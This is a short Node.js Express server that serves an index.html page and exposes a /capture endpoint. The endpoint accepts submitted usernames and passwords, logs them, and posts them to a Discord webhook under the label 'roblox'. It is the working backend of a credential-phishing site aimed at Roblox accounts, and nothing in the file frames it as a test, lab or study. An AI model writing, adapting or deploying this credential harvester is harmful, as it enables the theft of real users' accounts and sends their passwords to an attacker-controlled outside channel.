const express = require("express");
const path = require("path");
const app = express();

app.use(express.urlencoded({ extended: true }));
app.use(express.json());
app.use(express.static(__dirname, { etag: false, lastModified: false }));

const webhook = process.env.DISCORD_WEBHOOK;

app.post("/capture", async (req, res) => {
  const { username, password } = req.body;
  const safeUser = typeof username === "string" ? username : "";
  const safePass = typeof password === "string" ? password : "";
  if (!safeUser || !safePass) return res.status(400).json({ error: "missing" });
  console.log("captured:", safeUser, safePass);
  if (webhook) {
    try {
      await fetch(webhook, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ content: `roblox\nuser: ${safeUser}\npass: ${safePass}` })
      });
    } catch (e) { console.error(e); }
  }
  res.json({ status: "ok" });
});

app.get("/", (req, res) => res.sendFile(path.join(__dirname, "index.html")));

app.listen(process.env.PORT || 3000, () => console.log("started", process.env.PORT || 3000));
